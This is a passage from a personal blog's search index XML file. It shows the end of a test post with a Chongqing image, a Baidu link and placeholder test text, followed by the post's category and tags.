src="/%5Cimg%5Cin-post%5Cpost-chongqing-tour.jpg" alt="Chongqing"></p><!--This is a test of illustrates--><p><a href="%E7%99%BE%E5%BA%A6">https://www.baidu.com</a></p><p>This is a test of hyperlink</p><p>![[Pasted image 20221129172440.png]]<br><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8m5i8dewgj31780ledgm.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
      <tag>感想</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
